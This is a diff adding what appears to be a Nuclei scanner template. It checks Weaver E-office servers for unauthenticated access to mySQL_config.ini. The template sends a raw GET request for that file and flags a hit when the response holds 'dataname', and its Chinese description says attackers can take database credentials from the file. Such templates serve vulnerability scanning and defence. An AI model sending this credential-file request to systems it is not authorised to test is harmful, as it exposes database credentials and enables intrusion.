@@ -1,0 +1,25 @@
+id: weaver-e-office-config-exposure
+
+info:
+  name: "泛微 E-office mySQL_config.ini 敏感配置文件未授权访问"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞涉及泛微 E-office 系统中 mySQL_config.ini 配置文件的未授权访问问题。
+      由于缺乏访问控制机制，攻击者可直接请求该文件路径，获取包含数据库连接凭证的敏感信息。
+      该配置文件通常存储在 web 根目录下，路径可被推测或枚举发现。
+      通过成功利用此漏洞，攻击者可进一步实施数据库注入或横向渗透攻击。
+      
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /mysql_config.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'dataname'
